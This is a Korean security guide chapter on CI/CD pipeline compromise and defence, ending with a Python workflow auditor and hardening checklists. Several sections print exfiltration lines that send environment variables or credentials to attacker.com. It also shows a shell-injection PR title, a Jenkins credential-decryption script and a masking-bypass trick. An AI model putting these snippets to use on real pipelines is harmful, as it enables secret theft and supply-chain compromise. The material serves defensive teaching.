# 02 — 빌드 환경 및 CI/CD 파이프라인 침해

## 1. CI/CD 파이프라인 공격 개요

현대 소프트웨어 개발의 핵심 인프라인 CI/CD 파이프라인은 코드를 자동으로 빌드·테스트·배포한다. 이 파이프라인은 소스 코드·프로덕션 환경·서명 키·클라우드 자격증명을 모두 접근할 수 있어 공급망 공격의 최고 가치 목표다.

### 공격 표면

```
소스 저장소 (GitHub/GitLab/Bitbucket)
    ↓
CI/CD 파이프라인 (Actions/Jenkins/GitLab CI)
    ↓
빌드 환경 (Runner, Agent, Worker)
    ↓
아티팩트 저장소 (JFrog, Nexus, ECR)
    ↓
배포 환경 (Kubernetes, ECS, Lambda)
```

---

## 2. GitHub Actions 파이프라인 침해

### 2-1. 악성 GitHub Action 주입

```yaml
# 공격자가 만든 악성 액션 (악성 코드가 숨겨진 예시)
# .github/actions/malicious-setup/action.yml
name: "Setup Environment"
description: "Sets up the build environment"
runs:
  using: "composite"
  steps:
    - name: Install dependencies
      shell: bash
      run: |
        pip install -r requirements.txt
        # 아래는 악성 코드 — 자격증명 탈취
        env | curl -s -X POST https://attacker.com/env \
          -H "Content-Type: text/plain" \
          -d @- &>/dev/null &
```

### 2-2. 피닝(Pinning) 없는 외부 액션 사용

```yaml
# 취약한 설정 — 태그만 사용 (태그는 변경 가능)
- uses: actions/checkout@v3          # 태그가 변경될 수 있음
- uses: third-party/setup-tool@main  # main 브랜치 직접 사용 = 위험

# 안전한 설정 — 커밋 해시 고정
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
- uses: actions/setup-python@65d7f2d534ac1bc67fcd62888c5f4f3d2cb2b236  # v4.7.1
```

### 2-3. 워크플로우 인젝션 (Expression Injection)

```yaml
# 취약한 워크플로우 — PR 제목이 셸 인젝션 벡터
name: Greet PR
on: pull_request
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Print PR title
        run: |
          # 취약: github.event.pull_request.title이 공격자 제어 가능
          echo "PR: ${{ github.event.pull_request.title }}"
          # 악성 PR 제목: "; curl attacker.com/$(cat /etc/passwd | base64) #"

# 안전한 방법: 환경변수로 분리
      - name: Print PR title (safe)
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "PR: $PR_TITLE"  # 셸 인터프리터가 변수 내용을 실행하지 않음
```

### 2-4. 권한 남용 — GITHUB_TOKEN

```yaml
# 취약: 과도한 권한
name: Deploy
on: push
permissions: write-all  # 모든 권한 부여

# 안전: 최소 권한 원칙
permissions:
  contents: read
  packages: write
  id-token: write  # OIDC 인증에만 필요

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read    # 작업 수준 권한 재정의
      packages: write
```

### 2-5. 시크릿 유출 벡터

```bash
# CI 환경에서 시크릿이 유출되는 경로

# 1. 로그에 직접 출력
echo "Token: ${{ secrets.API_TOKEN }}"  # 로그에 출력됨

# 2. 환경변수 덤프
env > /tmp/env.txt  # 모든 시크릿 포함

# 3. 서브프로세스로 전달
curl -H "Authorization: Bearer $API_TOKEN" ...  # 프로세스 목록에 노출

# 4. 아티팩트에 포함
actions/upload-artifact@v4  # .env 파일이 포함된 경우

# 탐지: GitHub Actions 시크릿 마스킹 우회
# 시크릿을 base64 인코딩하면 마스킹 우회 가능
echo $SECRET | base64  # 마스킹 안 됨
```

---

## 3. Jenkins 파이프라인 공격

### 3-1. Groovy 스크립트 인젝션

```groovy
// Jenkins Shared Library 악성 코드 주입
// vars/commonBuild.groovy 에 백도어 삽입

def call(Map config = [:]) {
    pipeline {
        agent any
        stages {
            stage('Build') {
                steps {
                    sh 'make build'
                    // 악성 코드: 자격증명 탈취
                    script {
                        def creds = sh(
                            script: 'cat $JENKINS_HOME/credentials.xml',
                            returnStdout: true
                        )
                        httpRequest(
                            url: "https://attacker.com/collect",
                            requestBody: creds,
                            httpMode: 'POST'
                        )
                    }
                }
            }
        }
    }
}
```

### 3-2. Jenkins 자격증명 탈취

```bash
# Jenkins credentials.xml 복호화
# Jenkins 서버에서 실행 (Groovy Script Console 통해)

# Groovy Script Console 경로: /script
# 아래 스크립트로 저장된 자격증명 복호화

import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import jenkins.model.Jenkins

def creds = CredentialsProvider.lookupCredentials(
    StandardUsernamePasswordCredentials.class,
    Jenkins.instance,
    null,
    null
)
creds.each { c ->
    println "${c.id}: ${c.username} / ${c.password.plainText}"
}
```

### 3-3. 빌드 에이전트 탈취

```bash
# Jenkins Agent를 통한 횡적 이동
# 에이전트는 컨트롤러와 JNLP 연결 → 동일 네트워크 내 다른 시스템 접근

# 에이전트에서 다른 노드 접근 시도
# /var/lib/jenkins/.ssh/known_hosts 에 SSH 키가 있는 경우
ssh -i /var/lib/jenkins/.ssh/id_rsa user@internal-server

# 공유 파일시스템 마운트 확인
mount | grep nfs
ls /mnt/shared/  # 다른 빌드의 아티팩트에 접근 가능
```

---

## 4. GitLab CI 파이프라인 공격

### 4-1. Runner 권한 탈취

```yaml
# .gitlab-ci.yml — 취약한 설정
variables:
  DEPLOY_KEY: $DEPLOY_PRIVATE_KEY  # 시크릿 환경변수

build:
  stage: build
  script:
    - eval $(ssh-agent -s)
    - echo "$DEPLOY_KEY" | ssh-add -  # 에이전트에 키 추가
    - ssh-add -l  # 키 목록 출력 — 공격자가 에이전트 소켓 탈취 가능

# Runner의 /tmp 또는 /proc/$(pgrep ssh-agent)/environ 접근으로 키 탈취
```

### 4-2. CI 변수를 통한 공급망 침해

```bash
# Merge Request에서 fork로부터의 CI 변수 노출
# protected 변수가 아닌 경우 fork MR에서 접근 가능

# GitLab CI 변수 보안 설정
# Settings > CI/CD > Variables
# - Protected: main/master 브랜치에서만 사용 가능
# - Masked: 로그에서 마스킹

# 악성 MR이 CI 변수에 접근하는 방법
# .gitlab-ci.yml (악성 fork)
expose_secrets:
  script:
    - env | curl -X POST https://attacker.com/env -d @-
  only:
    - merge_requests
```

---

## 5. 빌드 캐시 포이즈닝

### 5-1. 캐시 키 충돌 공격

```yaml
# GitHub Actions 캐시 포이즈닝
# 동일 캐시 키를 사용하는 다른 워크플로우/브랜치가 있는 경우

- name: Cache pip packages
  uses: actions/cache@v3
  with:
    path: ~/.cache/pip
    # 취약: 브랜치나 OS를 키에 포함하지 않음
    key: pip-${{ hashFiles('requirements.txt') }}

# 공격: requirements.txt 해시를 미리 계산하여 악성 캐시를 선점
# - 공개 fork에서 동일 해시의 캐시를 악성 패키지로 채움
# - 캐시 격리가 없으면 메인 레포에서도 해당 캐시 사용

# 안전한 캐시 키 — 레포 + 브랜치 + OS 포함
key: ${{ runner.os }}-${{ github.repository }}-pip-${{ hashFiles('requirements.txt') }}
```

### 5-2. 아티팩트 포이즈닝

```bash
# JFrog Artifactory 캐시 포이즈닝 시나리오

# 1. 내부 패키지를 외부 저장소에서 가져오는 설정
# repositories:
#   - id: central
#     url: https://repo.maven.apache.org/maven2
#   - id: internal
#     url: https://internal.company.com/artifactory/libs-release

# 2. Maven 의존성 혼동: com.company:internal-lib:9.9.9 (공개 Maven에 등록)
# 3. Artifactory가 캐시 없을 때 외부 저장소 조회 → 악성 패키지 캐시

# 방어: 원격 저장소 목록에서 Maven Central 제거 또는 허용 목록 설정
# Artifactory > Repository > Inclusion Rules
# Include Pattern: com/company/**  (내부 패키지만 허용)
# Exclude Pattern: **  (그 외 모두 차단)
```

---

## 6. SLSA 레벨별 방어 전략

### 6-1. SLSA 레벨 정의

```
SLSA L0: 보장 없음 (대부분의 현재 상태)

SLSA L1:
  - 빌드 스크립트 버전 관리
  - 빌드 완전성(provenance) 문서 생성
  - 수동 빌드 허용

SLSA L2:
  - 호스팅된 빌드 서비스 사용 (로컬 빌드 불가)
  - 빌드 서비스가 provenance 생성 및 서명
  - GitHub Actions, Google Cloud Build 등

SLSA L3:
  - 강화된 빌드 서비스
  - 빌드 격리 (각 빌드는 독립 환경)
  - 감사 가능한 빌드 로그
  - Reusable Workflows만 허용

SLSA L4 (예정):
  - 두 당사자 검토 (two-party review)
  - 완전히 재현 가능한 빌드
  - 밀폐된 빌드 환경
```

### 6-2. GitHub Actions SLSA L3 구현

```yaml
# .github/workflows/release.yml — SLSA L3 provenance
name: Release with SLSA Provenance

on:
  push:
    tags:
      - 'v*'

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      hashes: ${{ steps.hash.outputs.hashes }}
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Build artifacts
        run: |
          make dist
          ls -la dist/

      - name: Generate SHA-256 hashes
        id: hash
        run: |
          cd dist
          HASHES=$(sha256sum * | base64 -w0)
          echo "hashes=$HASHES" >> $GITHUB_OUTPUT

  provenance:
    needs: [build]
    permissions:
      actions: read
      id-token: write
      contents: write
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.10.0
    with:
      base64-subjects: "${{ needs.build.outputs.hashes }}"
      upload-assets: true

  verify:
    needs: [build, provenance]
    runs-on: ubuntu-latest
    steps:
      - name: Install slsa-verifier
        run: |
          curl -Lo slsa-verifier \
            https://github.com/slsa-framework/slsa-verifier/releases/latest/download/slsa-verifier-linux-amd64
          chmod +x slsa-verifier

      - name: Download artifacts and provenance
        run: |
          gh release download ${{ github.ref_name }}
        env:
          GH_TOKEN: ${{ github.token }}

      - name: Verify provenance
        run: |
          ./slsa-verifier verify-artifact dist/*.tar.gz \
            --provenance-path *.intoto.jsonl \
            --source-uri github.com/${{ github.repository }} \
            --source-tag ${{ github.ref_name }}
```

---

## 7. Python 도구 — GitHub Actions 워크플로우 보안 감사기

```python
#!/usr/bin/env python3
"""
ci_workflow_auditor.py — GitHub Actions 워크플로우 보안 감사기

사용법:
    python ci_workflow_auditor.py scan --repo owner/repo --token $GH_TOKEN
    python ci_workflow_auditor.py local --dir .github/workflows/
    python ci_workflow_auditor.py batch --repos repos.txt --output report.json
"""

from __future__ import annotations

import argparse
import base64
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError


# ── 상수 ──────────────────────────────────────────────────────────────────────

GITHUB_API = "https://api.github.com"
REQUEST_TIMEOUT = 20
MAX_RETRIES = 3

# 위험 패턴 정의
RISK_PATTERNS: list[tuple[str, str, str]] = [
    # (패턴, 위험도, 설명)
    (
        r'uses:\s+[^@\s]+@(?![\da-f]{40})[^\s]+',
        "HIGH",
        "외부 액션을 커밋 해시 대신 태그/브랜치로 참조 (변조 가능)",
    ),
    (
        r'permissions:\s*write-all',
        "HIGH",
        "과도한 write-all 권한 설정",
    ),
    (
        r'\$\{\{\s*github\.event\.(issue\.body|pull_request\.title'
        r'|pull_request\.body|comment\.body|review\.body)\s*\}\}',
        "HIGH",
        "사용자 입력을 직접 실행 컨텍스트에 사용 (Expression Injection)",
    ),
    (
        r'run:.*\$\{\{\s*github\.event\.',
        "HIGH",
        "run 블록에서 GitHub 이벤트 데이터 직접 사용",
    ),
    (
        r'pull_request_target',
        "MEDIUM",
        "pull_request_target 사용 — fork 코드가 시크릿에 접근 가능",
    ),
    (
        r'on:\s*\[?push,?\s*pull_request\]?',
        "LOW",
        "push와 pull_request 동시 트리거 — 중복 실행",
    ),
    (
        r'secrets\.GITHUB_TOKEN.*write',
        "MEDIUM",
        "GITHUB_TOKEN으로 쓰기 작업 — 최소 권한 검토 필요",
    ),
    (
        r'curl.*\|\s*(bash|sh)',
        "HIGH",
        "원격 스크립트 직접 실행 (curl | bash 패턴)",
    ),
    (
        r'wget.*-O.*-\s*\|\s*(bash|sh)',
        "HIGH",
        "wget으로 다운로드 후 직접 실행",
    ),
    (
        r'npm install(?!\s+--ignore-scripts)',
        "MEDIUM",
        "npm install -- postinstall 스크립트 실행 가능 (--ignore-scripts 권장)",
    ),
    (
        r'pip install(?!\s+--require-hashes)',
        "LOW",
        "pip install -- 해시 검증 없이 설치 (--require-hashes 권장)",
    ),
    (
        r'actions/cache@(?![\da-f]{40})',
        "MEDIUM",
        "actions/cache를 커밋 해시 없이 사용 — 캐시 포이즈닝 위험",
    ),
    (
        r'env\s*>',
        "HIGH",
        "환경변수 전체를 파일로 출력 — 시크릿 유출 위험",
    ),
    (
        r'echo\s+\$\{\{\s*secrets\.',
        "HIGH",
        "시크릿을 로그에 직접 출력",
    ),
]


# ── 데이터 클래스 ──────────────────────────────────────────────────────────────

@dataclass
class RiskFinding:
    rule_id: str
    severity: str  # HIGH / MEDIUM / LOW
    description: str
    file: str
    line_number: int
    line_content: str
    pattern: str


@dataclass
class WorkflowAuditResult:
    repo: str
    workflow_file: str
    findings: list[RiskFinding] = field(default_factory=list)
    high_count: int = 0
    medium_count: int = 0
    low_count: int = 0
    error: str = ""

    def __post_init__(self) -> None:
        self.high_count = sum(1 for f in self.findings if f.severity == "HIGH")
        self.medium_count = sum(1 for f in self.findings if f.severity == "MEDIUM")
        self.low_count = sum(1 for f in self.findings if f.severity == "LOW")

    @property
    def risk_score(self) -> int:
        return self.high_count * 10 + self.medium_count * 3 + self.low_count


@dataclass
class RepoAuditReport:
    repo: str
    total_workflows: int
    results: list[WorkflowAuditResult]
    scan_duration_sec: float
    error: str = ""

    @property
    def total_high(self) -> int:
        return sum(r.high_count for r in self.results)

    @property
    def total_medium(self) -> int:
        return sum(r.medium_count for r in self.results)

    @property
    def total_low(self) -> int:
        return sum(r.low_count for r in self.results)


# ── GitHub API 클라이언트 ─────────────────────────────────────────────────────

class GitHubClient:
    def __init__(self, token: str | None = None) -> None:
        self.token = token
        self.base_headers = {
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "ci-workflow-auditor/1.0",
        }
        if token:
            self.base_headers["Authorization"] = f"Bearer {token}"

    def _request(self, url: str) -> Any:
        for attempt in range(MAX_RETRIES):
            try:
                req = Request(url, headers=self.base_headers)
                with urlopen(req, timeout=REQUEST_TIMEOUT) as resp:
                    return json.loads(resp.read())
            except HTTPError as e:
                if e.code == 403:
                    # Rate limit
                    reset = int(e.headers.get("X-RateLimit-Reset", 0))
                    wait = max(0, reset - int(time.time())) + 1
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(min(wait, 60))
                        continue
                    raise
                if e.code == 404:
                    return None
                raise
            except URLError:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2 ** attempt)
                    continue
                raise
        return None

    def get_workflows(self, repo: str) -> list[dict[str, Any]]:
        """저장소의 모든 워크플로우 파일 목록 반환"""
        url = f"{GITHUB_API}/repos/{repo}/contents/.github/workflows"
        result = self._request(url)
        if result is None:
            return []
        if isinstance(result, dict) and "message" in result:
            return []
        return [f for f in result if f.get("name", "").endswith((".yml", ".yaml"))]

    def get_file_content(self, repo: str, path: str) -> str | None:
        """파일 내용을 base64 디코딩하여 반환"""
        url = f"{GITHUB_API}/repos/{repo}/contents/{path}"
        result = self._request(url)
        if not result or "content" not in result:
            return None
        try:
            content = result["content"].replace("\n", "")
            return base64.b64decode(content).decode("utf-8", errors="replace")
        except Exception:
            return None


# ── 워크플로우 분석기 ─────────────────────────────────────────────────────────

class WorkflowAnalyzer:
    def __init__(self) -> None:
        self.compiled_patterns = [
            (re.compile(pat, re.IGNORECASE | re.MULTILINE), sev, desc)
            for pat, sev, desc in RISK_PATTERNS
        ]

    def analyze(self, content: str, file_path: str, repo: str = "") -> WorkflowAuditResult:
        findings: list[RiskFinding] = []
        lines = content.splitlines()

        for line_num, line in enumerate(lines, start=1):
            # 주석 제거 (yaml # 주석)
            stripped = line.strip()
            if stripped.startswith("#"):
                continue

            for idx, (pattern, severity, description) in enumerate(
                self.compiled_patterns
            ):
                if pattern.search(line):
                    findings.append(
                        RiskFinding(
                            rule_id=f"WF-{idx+1:03d}",
                            severity=severity,
                            description=description,
                            file=file_path,
                            line_number=line_num,
                            line_content=line.rstrip()[:200],
                            pattern=RISK_PATTERNS[idx][0],
                        )
                    )

        result = WorkflowAuditResult(
            repo=repo,
            workflow_file=file_path,
            findings=findings,
        )
        return result

    def analyze_directory(self, directory: Path, repo: str = ".") -> list[WorkflowAuditResult]:
        results: list[WorkflowAuditResult] = []
        workflow_dir = directory / ".github" / "workflows"
        if not workflow_dir.exists():
            workflow_dir = directory  # 직접 경로인 경우

        for wf_file in sorted(workflow_dir.glob("*.yml")) + sorted(workflow_dir.glob("*.yaml")):
            try:
                content = wf_file.read_text(encoding="utf-8")
                result = self.analyze(content, str(wf_file), repo)
                results.append(result)
            except (OSError, UnicodeDecodeError) as e:
                results.append(
                    WorkflowAuditResult(
                        repo=repo,
                        workflow_file=str(wf_file),
                        error=str(e),
                    )
                )
        return results


# ── 저장소 스캐너 ─────────────────────────────────────────────────────────────

class RepoScanner:
    def __init__(self, token: str | None = None, workers: int = 5) -> None:
        self.client = GitHubClient(token)
        self.analyzer = WorkflowAnalyzer()
        self.workers = workers

    def scan_repo(self, repo: str) -> RepoAuditReport:
        start = time.monotonic()
        workflow_files = self.client.get_workflows(repo)
        results: list[WorkflowAuditResult] = []

        if not workflow_files:
            return RepoAuditReport(
                repo=repo,
                total_workflows=0,
                results=[],
                scan_duration_sec=time.monotonic() - start,
                error="워크플로우 파일 없음 또는 접근 불가",
            )

        def process_file(wf: dict[str, Any]) -> WorkflowAuditResult:
            path = wf.get("path", "")
            content = self.client.get_file_content(repo, path)
            if content is None:
                return WorkflowAuditResult(
                    repo=repo,
                    workflow_file=path,
                    error="파일 내용 읽기 실패",
                )
            return self.analyzer.analyze(content, path, repo)

        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = {
                executor.submit(process_file, wf): wf
                for wf in workflow_files
            }
            for future in as_completed(futures):
                results.append(future.result())

        return RepoAuditReport(
            repo=repo,
            total_workflows=len(workflow_files),
            results=results,
            scan_duration_sec=time.monotonic() - start,
        )

    def scan_repos_batch(self, repos: list[str]) -> list[RepoAuditReport]:
        reports: list[RepoAuditReport] = []
        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = {
                executor.submit(self.scan_repo, r): r for r in repos
            }
            for future in as_completed(futures):
                reports.append(future.result())
        return reports


# ── 출력 포맷터 ───────────────────────────────────────────────────────────────

SEVERITY_ICON = {"HIGH": "[!]", "MEDIUM": "[*]", "LOW": "[-]"}


class AuditFormatter:
    @staticmethod
    def print_report(report: RepoAuditReport) -> None:
        print(f"\n{'='*65}")
        print(f"저장소: {report.repo}")
        print(f"워크플로우: {report.total_workflows}개 | "
              f"소요: {report.scan_duration_sec:.2f}초")

        if report.error:
            print(f"오류: {report.error}")
            return

        total_findings = sum(len(r.findings) for r in report.results)
        print(f"발견: HIGH={report.total_high}, "
              f"MEDIUM={report.total_medium}, LOW={report.total_low} "
              f"(총 {total_findings}건)")

        # 위험도 높은 순 정렬
        sorted_results = sorted(
            report.results,
            key=lambda r: r.risk_score,
            reverse=True,
        )

        for result in sorted_results:
            if not result.findings:
                continue
            print(f"\n  파일: {result.workflow_file}")
            for f in result.findings:
                icon = SEVERITY_ICON.get(f.severity, "[ ]")
                print(f"    {icon} [{f.severity}] {f.description}")
                print(f"       L{f.line_number}: {f.line_content[:80]}")

    @staticmethod
    def to_json(reports: list[RepoAuditReport]) -> str:
        data = []
        for r in reports:
            item = {
                "repo": r.repo,
                "total_workflows": r.total_workflows,
                "scan_duration_sec": round(r.scan_duration_sec, 3),
                "summary": {
                    "high": r.total_high,
                    "medium": r.total_medium,
                    "low": r.total_low,
                },
                "workflows": [
                    {
                        "file": res.workflow_file,
                        "risk_score": res.risk_score,
                        "findings": [asdict(f) for f in res.findings],
                    }
                    for res in sorted(
                        r.results, key=lambda x: x.risk_score, reverse=True
                    )
                ],
                "error": r.error,
            }
            data.append(item)
        return json.dumps(data, ensure_ascii=False, indent=2)

    @staticmethod
    def print_summary(reports: list[RepoAuditReport]) -> None:
        print(f"\n{'='*65}")
        print(f"{'저장소':<35} {'HIGH':>5} {'MED':>5} {'LOW':>5} {'SCORE':>6}")
        print("-" * 65)
        sorted_reports = sorted(
            reports,
            key=lambda r: r.total_high * 10 + r.total_medium * 3 + r.total_low,
            reverse=True,
        )
        for r in sorted_reports:
            score = r.total_high * 10 + r.total_medium * 3 + r.total_low
            print(f"{r.repo:<35} {r.total_high:>5} "
                  f"{r.total_medium:>5} {r.total_low:>5} {score:>6}")


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="ci_workflow_auditor",
        description="GitHub Actions 워크플로우 보안 감사기",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  # 원격 저장소 스캔
  python ci_workflow_auditor.py scan --repo owner/myrepo --token $GH_TOKEN

  # 토큰 없이 공개 저장소 스캔
  python ci_workflow_auditor.py scan --repo kubernetes/kubernetes

  # 로컬 워크플로우 디렉터리 스캔
  python ci_workflow_auditor.py local --dir /path/to/project

  # 여러 저장소 일괄 스캔
  python ci_workflow_auditor.py batch --repos repos.txt \\
    --token $GH_TOKEN --output report.json --workers 8
        """,
    )

    sub = parser.add_subparsers(dest="command", required=True)

    # scan
    scan_p = sub.add_parser("scan", help="원격 GitHub 저장소 스캔")
    scan_p.add_argument("--repo", required=True, help="owner/repo 형식")
    scan_p.add_argument("--token", help="GitHub Personal Access Token")
    scan_p.add_argument("--output", help="JSON 보고서 저장 경로")
    scan_p.add_argument("--workers", type=int, default=5)

    # local
    local_p = sub.add_parser("local", help="로컬 디렉터리 스캔")
    local_p.add_argument("--dir", required=True, help="프로젝트 루트 경로")
    local_p.add_argument("--output", help="JSON 보고서 저장 경로")

    # batch
    batch_p = sub.add_parser("batch", help="여러 저장소 일괄 스캔")
    batch_p.add_argument("--repos", required=True,
                         help="저장소 목록 파일 (한 줄에 하나씩)")
    batch_p.add_argument("--token", help="GitHub PAT")
    batch_p.add_argument("--output", help="JSON 보고서 저장 경로")
    batch_p.add_argument("--workers", type=int, default=5)

    return parser


def cmd_scan(args: argparse.Namespace) -> int:
    token = args.token
    scanner = RepoScanner(token=token, workers=args.workers)
    formatter = AuditFormatter()

    report = scanner.scan_repo(args.repo)
    formatter.print_report(report)

    if args.output:
        Path(args.output).write_text(
            formatter.to_json([report]), encoding="utf-8"
        )
        print(f"\n보고서 저장: {args.output}")

    return 1 if report.total_high > 0 else 0


def cmd_local(args: argparse.Namespace) -> int:
    directory = Path(args.dir)
    if not directory.exists():
        print(f"경로 없음: {directory}", file=sys.stderr)
        return 2

    analyzer = WorkflowAnalyzer()
    formatter = AuditFormatter()
    results = analyzer.analyze_directory(directory)

    report = RepoAuditReport(
        repo=str(directory),
        total_workflows=len(results),
        results=results,
        scan_duration_sec=0.0,
    )
    formatter.print_report(report)

    if args.output:
        Path(args.output).write_text(
            formatter.to_json([report]), encoding="utf-8"
        )
        print(f"\n보고서 저장: {args.output}")

    return 1 if report.total_high > 0 else 0


def cmd_batch(args: argparse.Namespace) -> int:
    repos_file = Path(args.repos)
    if not repos_file.exists():
        print(f"파일 없음: {repos_file}", file=sys.stderr)
        return 2

    repos = [
        line.strip()
        for line in repos_file.read_text().splitlines()
        if line.strip() and not line.startswith("#")
    ]

    if not repos:
        print("저장소 목록이 비어 있습니다.", file=sys.stderr)
        return 2

    print(f"{len(repos)}개 저장소 스캔 시작...")
    scanner = RepoScanner(token=args.token, workers=args.workers)
    formatter = AuditFormatter()

    reports = scanner.scan_repos_batch(repos)

    for report in reports:
        formatter.print_report(report)

    formatter.print_summary(reports)

    if args.output:
        Path(args.output).write_text(
            formatter.to_json(reports), encoding="utf-8"
        )
        print(f"\n보고서 저장: {args.output}")

    total_high = sum(r.total_high for r in reports)
    return 1 if total_high > 0 else 0


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    dispatch = {"scan": cmd_scan, "local": cmd_local, "batch": cmd_batch}
    handler = dispatch.get(args.command)
    if handler is None:
        parser.print_help()
        return 2

    try:
        return handler(args)
    except KeyboardInterrupt:
        print("\n중단됨", file=sys.stderr)
        return 130
    except Exception as e:
        print(f"오류: {e}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
```

### 7-1. 도구 사용 예시

```bash
# 공개 저장소 스캔
python ci_workflow_auditor.py scan --repo kubernetes/kubernetes

# 인증 후 비공개 저장소 스캔
export GH_TOKEN=$(cat ~/.config/gh/token)
python ci_workflow_auditor.py scan \
  --repo myorg/private-repo \
  --token $GH_TOKEN \
  --output audit.json

# 로컬 프로젝트 스캔
python ci_workflow_auditor.py local --dir /home/user/myproject

# 조직 내 모든 저장소 일괄 스캔
gh repo list myorg --json nameWithOwner -q '.[].nameWithOwner' > repos.txt
python ci_workflow_auditor.py batch \
  --repos repos.txt \
  --token $GH_TOKEN \
  --output org_audit.json \
  --workers 10
```

---

## 8. Jenkins/GitLab CI 방어 설정

### 8-1. Jenkins 강화 설정

```groovy
// Jenkins Configuration as Code (JCasC)
// 파일: jenkins.yaml

jenkins:
  securityRealm:
    local:
      allowsSignup: false

  authorizationStrategy:
    projectMatrix:
      permissions:
        - "Overall/Read:authenticated"
        - "Job/Build:dev-team"
        - "Job/Configure:admin"

  # 스크립트 보안 활성화
  scriptApproval:
    approvedSignatures:
      - "method groovy.lang.GroovyObject getProperty java.lang.String"

# 시크릿 관리 — Jenkins 내장 대신 HashiCorp Vault 사용
credentials:
  system:
    domainCredentials:
      - credentials:
          - vaultAppRoleCredential:
              id: "vault-approle"
              description: "Vault AppRole for secrets"
              roleId: "${VAULT_ROLE_ID}"
              secretId: "${VAULT_SECRET_ID}"
```

### 8-2. GitLab CI 최소 권한 설정

```yaml
# .gitlab-ci.yml — 보안 강화 설정
variables:
  # Docker-in-Docker 비활성화 (가능하면)
  DOCKER_HOST: ""
  # npm 스크립트 자동 실행 방지
  NPM_CONFIG_IGNORE_SCRIPTS: "true"
  # pip 해시 검증 강제
  PIP_REQUIRE_HASHES: "1"

default:
  # 특권 모드 비활성화
  tags:
    - non-privileged
  # 타임아웃 제한
  timeout: 30 minutes

build:
  stage: build
  before_script:
    # 환경 감사
    - env | grep -v "CI_JOB_TOKEN" | sort > /tmp/env_before.txt
  script:
    - make build
  after_script:
    # 아티팩트에 .env 파일 포함 여부 확인
    - find dist/ -name "*.env" -o -name ".env*" | xargs -I{} echo "WARNING: {} in artifact"

# protected 변수만 사용하는 배포 스테이지
deploy:
  stage: deploy
  environment:
    name: production
  only:
    - main
  # protected 브랜치에서만 실행
```

---

## 9. 빌드 재현성 검증

```bash
# Reproducible Builds 검증
# 동일 소스에서 동일 바이너리가 생성되는지 확인

# Python 패키지 재현성 검증
pip download mypackage==1.0.0 -d /tmp/pkg1/
pip download mypackage==1.0.0 -d /tmp/pkg2/
sha256sum /tmp/pkg1/*.whl /tmp/pkg2/*.whl

# Docker 이미지 재현성
docker build --no-cache -t myapp:build1 .
docker build --no-cache -t myapp:build2 .
docker save myapp:build1 | sha256sum
docker save myapp:build2 | sha256sum
# 해시가 다르면 재현 불가 (타임스탬프, 순서 등)

# diffoscope로 바이너리 차이 분석
diffoscope /tmp/pkg1/mypackage-1.0.0.whl /tmp/pkg2/mypackage-1.0.0.whl

# SOURCE_DATE_EPOCH로 타임스탬프 고정
export SOURCE_DATE_EPOCH=$(git log -1 --format=%ct)
python -m build
```

---

## 10. 파이프라인 보안 체크리스트

```
GitHub Actions:
  □ 외부 액션은 모두 커밋 SHA로 고정
  □ permissions: 최소 권한으로 명시
  □ 시크릿은 환경변수로만 전달 (run 블록에 직접 삽입 금지)
  □ pull_request_target 사용 시 fork 코드 체크아웃 금지
  □ 워크플로우 파일 변경은 코드 리뷰 필수
  □ Reusable Workflows만 허용 (L3 목표)
  □ OIDC 기반 클라우드 인증 (장기 자격증명 제거)

Jenkins:
  □ Script Security Plugin 활성화
  □ Agent-to-Controller 보안 활성화
  □ 각 빌드를 독립 컨테이너에서 실행
  □ Jenkins 자격증명 대신 Vault 사용
  □ Shared Library는 별도 승인 프로세스

일반:
  □ 빌드 아티팩트 서명 (sigstore/cosign)
  □ SLSA provenance 생성
  □ 빌드 로그 감사 보존 (90일 이상)
  □ 비정상 빌드 시간 알림 설정
```
